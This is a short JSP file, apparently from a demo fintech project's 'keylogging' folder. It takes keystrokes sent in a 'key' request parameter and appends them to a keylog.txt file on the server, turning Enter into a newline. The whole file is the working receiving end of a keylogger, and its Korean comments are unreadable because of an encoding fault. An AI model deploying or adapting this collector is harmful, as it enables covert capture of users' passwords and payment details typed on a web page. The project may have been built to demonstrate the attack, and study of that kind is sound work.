<%@ page import="java.io.*" %>
<%
    String key = request.getParameter("key");
    if (key != null) {
        try {
            // ������ ��ο� ���� ����
            File file = new File("C:\\kdg\\tomcat\\webapps\\fintech_pj_damn\\keylogging\\keylog.txt");
            // ���Ͽ� ���ڿ� �߰� ���� �ۼ�
            OutputStreamWriter osw = new OutputStreamWriter(new FileOutputStream(file, true), "UTF-8");
            // ���Ͽ� ���ڿ� �ۼ�
            if (key.equals(" Enter ")) {
                osw.write("\n");
            } else {
                osw.write(key);
            }
            osw.close();
        } catch(IOException e) {
            e.printStackTrace();
        }
    }

%>